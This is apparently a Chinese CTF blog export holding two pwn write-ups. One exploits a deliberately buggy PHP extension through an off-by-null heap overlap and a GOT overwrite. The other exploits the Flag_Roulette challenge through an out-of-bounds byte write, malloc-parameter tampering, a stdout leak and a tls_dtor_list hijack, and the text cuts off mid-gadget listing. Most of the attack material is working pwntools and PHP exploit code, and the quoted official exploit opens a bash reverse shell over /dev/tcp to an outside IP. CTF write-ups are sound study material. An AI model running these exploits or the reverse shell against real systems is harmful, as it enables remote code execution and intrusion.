文件，然后访问触发&lt;?php@error_reporting(E_ALL);$file = $_FILES['file'];if (!isset($file)){    die('upload error');}$result = move_uploaded_file($file['tmp_name'], $file['name']);if ($result){    echo 'upload success';}else{    echo 'upload error';}‍调试方法‍‍  本机配置php.ini vlun.so/etc/php/8.3/apache2/php.ini添加extension = vuln.so然后把所需要的 so 放到指定目录， 后面再启动的后应该就可以成功加载了‍​​‍  启动 docker 后可以在本机看到进程，但是由于使用的是 apache2 + php , 直接这个pid 是无法断点和跟进程序的，反正我是这样…​​‍      直接用本机apache2 + php 环境调试，        所以说，没法直接调试，我们可以是用 /usr/sbin/apachectl -X​ 即可调试进程.  apachectl​是一个 shell脚本  ​​  pid 80795 是真正的 执行程序，后面就调试它​​‍  gdb pdi​​  可以看到存在漏洞的 .so,后面就是边看边调试了​​‍  交互脚本from pwn import *from os import systemimport syss       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','190']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    elif args.AWD:        # python3 exp.py AWD 1.1.1.1 PORT        IP = str(sys.argv[1])        PORT = int(sys.argv[2])        return remote(IP,PORT)    else:        return process([binary] + argv, *a, **kw)io = process(['/usr/sbin/apachectl', '-X'])print(io.pid)sleep(0.1)import subprocessgdbscript = '''b *zif_addHacker#b *zif_displayHackerb *zif_editHacker#b *zif_editHackerc'''command = [\"pgrep\", \"-f\", \"/usr/sbin/apache2\"]result = subprocess.run(command, capture_output=True, text=True)pids = int(result.stdout.strip().split(\"\\n\")[0])gdb.attach(pids,gdbscript)pause()system('cp exp.php /var/www/html/exp.php')system('curl http://127.0.0.1/exp.php')itr()‍分析 vuln.so  大致是这几个函数addHacker()removeHacker()displasyHacker()edithacker()​​‍  分析出的函数传参和调用addHacker(\"test1\",\"test2\");# text, text// 下面的基本上猜都能猜出来removeHack(0);\t\t# idxeditHack(0,\"ntxt\"); # idx, new_textdisplayHack(0);\t\t# idx‍​​‍漏洞分析‍​​‍‍addHacker(str_repeat(\"A\", 0x8), str_repeat(\"B\", 0x30));  还没有触发 off by null​ 时，0x77b36de73040​ 里面存的指针还是正常的​​  ​off by null​ 触发后，下面的那个链表已经被修改了​​‍  重叠了, 后面就是指针打指针了，正好指向的是 editHacker() 编辑的指针​​  脚本试一下&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function hex($addr){    return dechex($addr);}// str_repeat(\"\\x90\", 0x8)// str_pad($cmd, 0x20, \"\\x00\")function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc,$mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    #$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20230831\\/vuln.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}ob_start(\"leakaddr\");include(\"/proc/self/maps\");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);$libc_base=hexdec($libc[1][0]);$module_base=hexdec($mbase[1][0]);//echo hex($libc_base).\"\\n\";//echo hex($module_base).\"\\n\";$pay = p64($module_base + 0x4020);$pay = str_pad($pay,0x40,\"\\x01\");addHacker(str_repeat(\"A\", 0x8), str_repeat(\"B\", 0x30));addHacker($pay, str_repeat(\"D\", 0x2f));editHacker(0,'111');?&gt;  可以看到 strlen 的 got 已经杯修改了，后面其实就很简单了​​‍  getshell​​​​​​‍‍exploit  这里只是测试的本地环境&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function hex($addr){    return dechex($addr);}// str_repeat(\"\\x90\", 0x8)// str_pad($cmd, 0x20, \"\\x00\")function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc,$mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    #$p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/lib\\/php\\/20230831\\/vuln.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}ob_start(\"leakaddr\");include(\"/proc/self/maps\");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);$libc_base=hexdec($libc[1][0]);$module_base=hexdec($mbase[1][0]);$system = $libc_base +  362304;//echo hex($libc_base).\"\\n\";//echo hex($module_base).\"\\n\";$cmd = \"echo `whoami`\\x00\";$pay = p64($module_base + 0x4020);$pay = str_pad($pay,0x40,\"\\x01\");addHacker(str_repeat(\"A\", 0x8), str_repeat(\"B\", 0x30));addHacker($pay, str_repeat(\"D\", 0x2f));addHacker($cmd,$cmd);editHacker(0,p64($system));displayHacker(2);?&gt;‍‍官方Wp-exploit-学&lt;?php$heap_base = 0;$libc_base = 0;$libc = \"\";$mbase = \"\";function u64($leak){    $leak = strrev($leak);    $leak = bin2hex($leak);    $leak = hexdec($leak);    return $leak;}function p64($addr){    $addr = dechex($addr);    $addr = hex2bin($addr);    $addr = strrev($addr);    $addr = str_pad($addr, 8, \"\\x00\");    return $addr;}function leakaddr($buffer){    global $libc,$mbase;    $p = '/([0-9a-f]+)\\-[0-9a-f]+ .* \\/usr\\/lib\\/x86_64-linux-gnu\\/libc.so.6/';    $p1 = '/([0-9a-f]+)\\-[0-9a-f]+ .*  \\/usr\\/local\\/lib\\/php\\/extensions\\/no-debug-non-zts-20230831\\/vuln.so/';    preg_match_all($p, $buffer, $libc);    preg_match_all($p1, $buffer, $mbase);    return \"\";}function leak(){    global $libc_base, $module_base, $libc, $mbase;    ob_start(\"leakaddr\");    include(\"/proc/self/maps\");    $buffer = ob_get_contents();    ob_end_flush();    leakaddr($buffer);    $libc_base=hexdec($libc[1][0]);    $module_base=hexdec($mbase[1][0]);}function attack($cmd){    global $libc_base, $module_base;    $payload = str_pad(p64($module_base + 0x4038).p64(0xff), 0x40, \"\\x90\");    $gadget = p64($libc_base + 0x4c490);    addHacker(str_repeat(\"\\x90\", 0x8), str_repeat(\"\\x90\", 0x30));    addHacker($payload, str_repeat(\"\\x90\", 0x2f));    addHacker(str_pad($cmd, 0x20, \"\\x00\"), \"114514\");    editHacker(0, $gadget);}function main(){    $cmd = 'bash -c \"bash -i &gt;&amp; /dev/tcp/114.514.19.19/810 0&gt;&amp;1\"';    leak();    attack($cmd);    removeHacker(2);}main();?&gt;附件下载链接: https://pan.baidu.com/s/1vMlz4msbfnf0tQsNEMhlwA?pwd=imzl 提取码: imzl 复制这段内容后打开百度网盘手机App，操作更方便哦"
  },
  
  {
    "title": "2024-03-05-GCC-CTF-Pwn_Writeups",
    "url": "/posts/GCC-CTF/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-03-07 00:00:00 +0800",
    





    
    "snippet": "2024-03-05-GCC-CTFhttps://gcc-ctf.com/就看看题Flag_Roulette  Description  Are you tired of solving challs?  Here, have a little break. If we win my game, I will give you a flag.  I promise you I will n...",
    "content": "2024-03-05-GCC-CTFhttps://gcc-ctf.com/就看看题Flag_Roulette  Description  Are you tired of solving challs?  Here, have a little break. If we win my game, I will give you a flag.  I promise you I will not cheat :)  The flag is in the /flag file.  Author: 0xdeadbeef‍      Get          ​_IO_2_1_stdout_​ 泄露地址      ​mp_​ 结构题      Attack tls_dtor_list​ 指针 ORW 利用      ‍程序分析  所有安全措施似乎都处于活动状态.checksec ./flag_rouletteRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   58 Symbols        No    0               1               ./flag_roulette  代码执行选项仅限于传统的开放式读写策略seccomp-tools dump ./flag_roulette line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012 0009: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0012 0010: 0x15 0x01 0x00 0x0000000b  if (A == munmap) goto 0012 0011: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0013 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0013: 0x06 0x00 0x00 0x00000000  return KILL  反编译，main 函数int __fastcall __noreturn main(int argc, const char **argv, const char **envp){  char v3; // [rsp+Ch] [rbp-24h] BYREF  char v4; // [rsp+Dh] [rbp-23h]  char i; // [rsp+Eh] [rbp-22h]  char v6; // [rsp+Fh] [rbp-21h]  unsigned int v7; // [rsp+10h] [rbp-20h] BYREF  unsigned int v8; // [rsp+14h] [rbp-1Ch] BYREF  unsigned int j; // [rsp+18h] [rbp-18h]  unsigned int k; // [rsp+1Ch] [rbp-14h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v12; // [rsp+28h] [rbp-8h]  v12 = __readfsqword(0x28u);  ((void (__fastcall *)(int, const char **, const char **))banner)(argc, argv, envp);  v4 = 0;  while ( 1 )  {    while ( 1 )    {      ((void (*)(void))menu)();      i = 0;      v6 = 0;      for ( i = getchar(); i == 10; i = getchar() )        ;      while ( v6 != 10 )        v6 = getchar();      if ( i == 51 )        break;      if ( i &lt;= 51 )      {        if ( i == 49 )        {          if ( v4 == 1 )          {            puts(\"You already have a bet placed\");          }          else          {            puts(\"How many bytes would you like to bet on ?\");            printf(\"&gt; \");            __isoc99_scanf(\"%ud\", &amp;v8);            if ( (int)v8 &gt; 0x7F )            {              if ( (int)v8 &lt;= 0x21000 )              {                ptr = malloc((int)v8);                for ( j = 0; j &lt; v8; ++j )                {                  do                  {                    do                      *((_BYTE *)ptr + j) = rand();                    while ( *((char *)ptr + j) &lt;= 31 );                  }                  while ( *((_BYTE *)ptr + j) == 127 );                }                puts(\"Random pattern generated successfully\");                puts(\"\\nAs a sign of good will, we will let you modify set exactly one byte in this sea of randomness\");                puts(\"Please choose the index of the byte to modify\");                printf(\"&gt; \");                __isoc99_scanf(\"%ud\", &amp;v7);                puts(\"Please set the new value of this byte\");                printf(\"&gt; \");                __isoc99_scanf(\"%ud\", &amp;v3);                *((_BYTE *)ptr + v7) = v3;                puts(\"Modification successful\");                v4 = 1;              }              else              {                puts(\"Come on, you cannot be THAT lucky ;)\");              }            }            else            {              puts(\"Not enough bytes\");              puts(\"The bet is not risky enough\");            }          }        }        else if ( i == 50 )        {          if ( v4 )          {            free(ptr);            ptr = 0LL;            puts(\"Bet successfully deleted\");            v4 = 0;          }          else          {            puts(\"You have no bet placed\");          }        }      }    }    if ( v4 )      break;    puts(\"You have not placed a bet !\");  }  printf(\"Your bet : %s\\n\", (const char *)ptr);  for ( k = 0; k &lt; v8; k += 3 )  {    if ( *((_BYTE *)ptr + k) != 'G' )      lose();    if ( *((_BYTE *)ptr + k + 1) != 'C' )      lose();    if ( *((_BYTE *)ptr + k + 2) != 'C' )      lose();  }  win();}      主要的功能大概就是：          添加一个 0x80 ~ 0x21000​ 之间的一个堆块（只能同时存在一个堆块，需要释放后才能再次申请）      释放堆块      exit(0)        在添加堆块功能中可以修改 分配堆块中的one byte ，由于没有边界检查，这种疏忽会引入一个 相对的越界写入 漏洞。  (out-of-bound write)‍pwndbg&gt; vpLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA             Start                End Perm     Size Offset File    0x5995f6a88000     0x5995f6a89000 r--p     1000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a89000     0x5995f6a8a000 r-xp     1000   1000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8a000     0x5995f6a8b000 r--p     1000   2000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8b000     0x5995f6a8c000 r--p     1000   2000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8c000     0x5995f6a8d000 rw-p     1000   3000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f6a8d000     0x5995f6a9f000 rw-p    12000   5000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/flag_roulette    0x5995f757c000     0x5995f759d000 rw-p    21000      0 [heap]    0x7e197eadc000     0x7e197eb00000 rw-p    24000      0 [anon_7e197eadc]    # tls 所在段，申请的big chunk 也会在这里    0x7e197eb00000     0x7e197eb26000 r--p    26000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197eb26000     0x7e197ec7b000 r-xp   155000  26000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197ec7b000     0x7e197eccf000 r--p    54000 17b000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197eccf000     0x7e197ecd3000 r--p     4000 1cf000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197ecd3000     0x7e197ecd5000 rw-p     2000 1d3000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libc.so.6    0x7e197ecd5000     0x7e197ece2000 rw-p     d000      0 [anon_7e197ecd5]    0x7e197ece2000     0x7e197ece4000 r--p     2000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ece4000     0x7e197ecf2000 r-xp     e000   2000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ecf2000     0x7e197ed00000 r--p     e000  10000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ed00000     0x7e197ed01000 r--p     1000  1e000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ed01000     0x7e197ed02000 rw-p     1000  1f000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/libseccomp.so.2    0x7e197ed02000     0x7e197ed04000 rw-p     2000      0 [anon_7e197ed02]    0x7e197ed04000     0x7e197ed05000 r--p     1000      0 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed05000     0x7e197ed2a000 r-xp    25000   1000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed2a000     0x7e197ed34000 r--p     a000  26000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed34000     0x7e197ed36000 r--p     2000  30000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7e197ed36000     0x7e197ed38000 rw-p     2000  32000 /mnt/hgfs/Downloads/CTF_Time_No/2024_gccctf_Flag_Roulette/ld-linux-x86-64.so.2    0x7ffeecef8000     0x7ffeecf19000 rw-p    21000      0 [stack]    0x7ffeecf24000     0x7ffeecf28000 r--p     4000      0 [vvar]    0x7ffeecf28000     0x7ffeecf2a000 r-xp     2000      0 [vdso]0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]malloc 的部分工作原理这部分呢也是学到了新的知识，现在我们先看一下 malloc​ 的部分工作原理如果申请的size很大（超过  mp_.mmap_threshold​，默认为  128*1024 = 0x20000​），它就会使用  mmap​ 而不是将块放在heap中。#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) // 0x20000#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN······/* There is only one instance of the malloc parameters.  */static struct malloc_par mp_ ={  .top_pad = DEFAULT_TOP_PAD,  .n_mmaps_max = DEFAULT_MMAP_MAX,  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  .trim_threshold = DEFAULT_TRIM_THRESHOLD,#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  .arena_test = NARENAS_FROM_NCORES (1)#if USE_TCACHE  ,  .tcache_count = TCACHE_FILL_COUNT,  .tcache_bins = TCACHE_MAX_BINS,  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),  .tcache_unsorted_limit = 0 /* No limit.  */#endif};······static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av){  mchunkptr old_top;              /* incoming value of av-&gt;top */  INTERNAL_SIZE_T old_size;       /* its size */  char *old_end;                  /* its end address */  long size;                      /* arg to first MORECORE or mmap call */  char *brk;                      /* return value from MORECORE */  long correction;                /* arg to 2nd MORECORE call */  char *snd_brk;                  /* 2nd return val */  INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */  INTERNAL_SIZE_T end_misalign;   /* partial page left at end of new space */  char *aligned_brk;              /* aligned offset into brk */  mchunkptr p;                    /* the allocated/returned chunk */  mchunkptr remainder;            /* remainder from allocation */  unsigned long remainder_size;   /* its size */  size_t pagesize = GLRO (dl_pagesize);  bool tried_mmap = false;  /*     If have mmap, and the request size meets the mmap threshold, and     the system supports mmap, and there are few enough currently     allocated mmapped regions, try to directly map this request     rather than expanding top.   */  if (av == NULL      || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) // 这里 判断是否 大于等于 0x20000\t  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))    {      char *mm;      if (mp_.hp_pagesize &gt; 0 &amp;&amp; nb &gt;= mp_.hp_pagesize)\t    {\t      /* There is no need to issue the THP madvise call if Huge Pages are\t         used directly.  */\t      mm = sysmalloc_mmap (nb, mp_.hp_pagesize, mp_.hp_flags, av);\t      if (mm != MAP_FAILED)\t        return mm;\t    }      mm = sysmalloc_mmap (nb, pagesize, 0, av);      if (mm != MAP_FAILED)\treturn mm;      tried_mmap = true;    }······  一个错误： 第一次可以正常 malloc(0x21000)​ ,如果 free​ 后再次 malloc(0x21000)​ 就会报错read(0, \"\\n\", 1)                        = 1write(1, \"How many bytes would you like to\"..., 41How many bytes would you like to bet on ?) = 41write(1, \"\\n\", 1                                                                                                                                                                                                        )                       = 1write(1, \"&gt; \", 2&gt; )                       = 2read(0, 131056 # 第二次申请 0x1fff0\"1\", 1)                         = 1read(0, \"3\", 1)                         = 1read(0, \"1\", 1)                         = 1read(0, \"0\", 1)                         = 1read(0, \"5\", 1)                         = 1read(0, \"6\", 1)                         = 1read(0, \"\\n\", 1)                        = 1brk(0x583868910000)                     = 0xc+++ killed by SIGSYS (core dumped) +++[1]    40569 invalid system call (core dumped)  strace ./flag_roulette为了深入了解为什么会发生这种情况，我们研究了如何  free​ 工作并发现了一些有趣的东西。当您释放分配的块时  mmap​，它会更改  mp_.mmap_threshold​ 到您刚刚释放的块的大小。那么，我们的下一个  malloc(0x21000)​ 没用  mmap​ 因为，根据新的门槛，  0x21000​ 不够大。void__libc_free (void *mem){...  if (chunk_is_mmapped (p))                       /* release mmapped memory. */    {      /* See if the dynamic brk/mmap threshold needs adjusting.\t Dumped fake mmapped chunks do not affect the threshold.  */      if (!mp_.no_dyn_threshold          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)        {          mp_.mmap_threshold = chunksize (p);          mp_.trim_threshold = 2 * mp_.mmap_threshold;          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                      mp_.mmap_threshold, mp_.trim_threshold);        }      munmap_chunk (p);    }...}为了解决这个问题，我们需要一个好的策略。我们注意到了  __libc_free​ 功能：它只会改变  mp_.mmap_threshold​ 如果  mp_.no_dyn_threshold​ 为 0 （false）。 从我们分配块时开始，我们仍然具有一个字节 越界 （OOB） 写入功能，并且此偏移量从  libc​ 区域不会改变。这意味着我们可以调整  mp_.no_dyn_threshold​ 设置为 1 （true）。这样做意味着当我们释放块时，阈值不会改变，从而允许我们对  tls​ 和  libc​ 我们想要的区域。这之所以有效，是因为我们的  malloc(0x21000)​ 将始终使用  mmap​，将块放在  tls​ 和  libc​ 地区。​​‍mp_ 分析  先来研究一下这个东西  当您释放分配的块时  mmap​，它会更改  mp_.mmap_threshold​。那么，我们的下一个  malloc(0x21000)​ 没用  mmap​ 因为，根据新的门槛，  0x21000​ 不够大。#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main(){    char * ptr1 = malloc(0x21000);    printf(\"%p\\n\",ptr1);    free(ptr1); // 它会更改  `mp_.mmap_threshold` 加上刚释放的块的大小    char * ptr2 = malloc(0x21000);    printf(\"%p\\n\",ptr2);    return 0;}  第一次申请 0x21000,  trim_threshold​ 是 0x20000​​  然后释放, 可以看到 释放 mmap 分配的chunk 时，它会更改  mp_.mmap_threshold​ ，使它变得更大if (!mp_.no_dyn_threshold // 默认是 0， 如果我们把它改成1 是不是就不会执行到 改mp_.trim_threshold 的语句了          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)        {          mp_.mmap_threshold = chunksize (p);          mp_.trim_threshold = 2 * mp_.mmap_threshold; // 这里 mmap_threshold = 0x22000          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                      mp_.mmap_threshold, mp_.trim_threshold);        }​​​​pwndbg&gt; p mp_$4 = {  trim_threshold = 278528,  top_pad = 131072,  mmap_threshold = 139264,  arena_test = 8,  arena_max = 0,  thp_pagesize = 0,  hp_pagesize = 0,  hp_flags = 0,  n_mmaps = 0,  n_mmaps_max = 65536,  max_n_mmaps = 1,  no_dyn_threshold = 0,  mmapped_mem = 0,  max_mmapped_mem = 139264,  sbrk_base = 0x555555559000 \"\",  tcache_bins = 64,  tcache_max_bytes = 1032,  tcache_count = 7,  tcache_unsorted_limit = 0}  再次申请 0x21000 返回的地址 就是 heap 上的了​​‍分析攻击思路‍  首先申请一个big chunk (0x2000), malloc 会使用 mmap 来分配内存位置（tls 附近），每次申请完地址，我们可以改一个字节，利用 OOB 修改 mp_.no_dyn_threshold​​ 的值 不为空。  这样的话 free 时，就不会 执行到 mp_.trim_threshold = 2 * mp_.mmap_threshold;​​ 避免被更改‍‍exploit-change-mp_.no_dyn_threshold  ​mp_.no_dyn_threshold​ 还是比较好定位的（题目之给了 libc ld binary, 缺少一些符号表）add(0x21000,2065304,1) ​​  修改后​​‍  接下来再 free ，然后再申请基本上不会再报错了‍exploit-libc_leak      利用 OOB 修改 _IO2_1_stdout_._IO_write_ptr​ 的指向地址        只要 _IO_write_base​​ 和 _IO_write_ptr​​ 有差距就会输出_IO_write_base​​ 到 _IO_write_ptr​​ 直接的数据  from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './flag_roulette'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x1709b * __call_tls_dtors#continue'''.format(**locals())io = start(binary)def rol(num,i):    part1 = num &lt;&lt; i    part1 &amp;= (1 &lt;&lt; 64) - 1    part2 = num &gt;&gt; (64- i)    return part1 + part2def add(size,idx,data):    ru('&gt; ')    sl('1')    ru(\"How many bytes would you like to bet on ?\\n&gt; \")    sl(str(size)) # 0x7f ~ 0x21000    ru('Please choose the index of the byte to modify\\n&gt; ')    sl(str(idx))    ru('Please set the new value of this byte\\n&gt; ')    sl(str(data))def rm():    ru('&gt; ')    sl('2')# OOBdef write_b(offset,b):    add(0x21000,offset,b)    rm()def write_Q(addr,c):    global heap_ptr    offset = addr - heap_ptr    data = p64(c)    for i in range(8):        print(offset+i,data[i])        write_b(offset+i,data[i])# 修改 mp_.no_dyn_thresholdwrite_b(0x1f8398, 1)'''libc leak'''# 修改 _IO_write_ptradd(0x21000,0x1f9798, 0x20)ru('\\x00'*4)libc_base = uu64(r(6)) - 1923632tls_base  = libc_base - 10432heap_ptr = libc_base - 0x24ff0lss('libc_base')lss('tls_base')itr()  没修改前​​‍  修改后 _IO_write_ptr​ 大于 _IO_write_base​ 所以可以泄露 它们之间的数据包含一个 libc 上的地址​​‍​​‍exploit-Attack tls_dtor_list‍......# OOBwrite_b(0x1f8398, 1)'''libc leak'''add(0x21000,0x1f9798, 0x20)ru('\\x00'*4)libc_base = uu64(r(6)) - 1923632tls_base  = libc_base - 10432heap_ptr = libc_base - 0x24ff0rm()# tls_base + 0x30write_Q(tls_base+0x30,0x00)write_Q(tls_base-0x50, tls_base-0x48)write_Q(tls_base-0x48, rol(0x41424344,0x11))write_Q(tls_base-0x40, 0x44454647)add(0x21000,1,1)lss('libc_base')lss('tls_base')gdb.attach(io,gdbscript)ru('&gt; ')sl('3')itr()  观察 修改后 的tls附近的数据​​  现在已经可以控制执行流了，但是由于存在 seccomp​ 沙箱，不能使用 system​ execve​  只能通过 ORW 去读取flag 文件，还需要一个 gadget ~​​‍exploit-need_a_gadget‍  由于只能 通过ORW 的方式去读取flag, 只能 call​ 一个地址显然不能满足我们现在的需求  这里我们就需要使用栈迁移来帮助我们 进行 ROP ，还需要一个 gadget​​可以控制某些寄存器中的附近值raxrbx rdxrsir14r15  使用 ropper 工具，我们希望 可以控制 rbp 然后进行 leave​ . (如果你使用 ROPgadget可能就找不到这些gadget)‍​​➜  2024_gccctf_Flag_Roulette ropper(ropper)&gt; file ./libc.so.6[INFO] Load gadgets from cache[LOAD] loading... 100%[LOAD] removing double gadgets... 100%[INFO] File loaded.(libc.so.6/ELF/x86_64)&gt; search mov rbp[INFO] Searching for gadgets: mov rbp                                                                                                                                                                                                                 [INFO] File: ./libc.so.60x00000000000fd4a1: mov rbp, 0xffffffffffffffff; pop rbx; mov rax, rbp; pop rbp; pop r12; ret;0x00000000001644d2: mov rbp, cr6; out dx, eax; lea rax, [rdi + rcx + 0x20]; ret;0x00000000000fd45b: mov rbp, qword ptr [r12]; mov rax, rbp; pop rbx; pop rbp; pop r12; ret;0x0000000000093804: mov rbp, qword ptr [r8 + 8]; mov rdi, r8; mov rbx, qword ptr [r8]; call 0x263a0; mov rdi, rbp; call rbx;0x0000000000145e36: mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28];0x0000000000099ab4: mov rbp, qword ptr [rsi + 8]; mov rax, qword ptr [rbx + 0x40]; test byte ptr [rbx + 0x50], 1; jne 0x99a98; mov rdi, rsi; call rax;0x0000000000143473: mov rbp, qword ptr [rsp + 0x30]; mov rsi, rbx; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];0x000000000007eb00: mov rbp, r12; pop rbx; mov rax, 